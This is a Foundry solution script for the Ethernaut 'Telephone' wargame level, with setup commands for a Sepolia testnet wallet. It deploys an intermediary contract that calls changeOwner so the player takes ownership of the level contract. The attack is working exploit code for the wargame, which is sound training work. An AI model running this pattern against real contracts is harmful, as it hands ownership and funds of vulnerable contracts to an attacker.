// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Telephone.sol";

/*
    Solution script for the Ethernaut Level 4: Telephone

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in TelephoneScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Telephone.s.sol:TelephoneScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Telephone.s.sol/11155111
*/

contract TelephoneAttack {
    function attack(address target, address attacker) public {
        Telephone telephone = Telephone(target);
        telephone.changeOwner(attacker);
    }
}

contract TelephoneScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0xb5a20115c310B890954872b0FC298154Af00284A;
    Telephone public level4 = Telephone(instance);

    function run() external {
        vm.startBroadcast();

        // deploy the attack contract
        TelephoneAttack attacker = new TelephoneAttack();
        attacker.attack(instance, msg.sender);

        // if the player is not the owner then we have failed so revert
        require(level4.owner() == msg.sender, "Owner not updated correctly");

        vm.stopBroadcast();
    }
}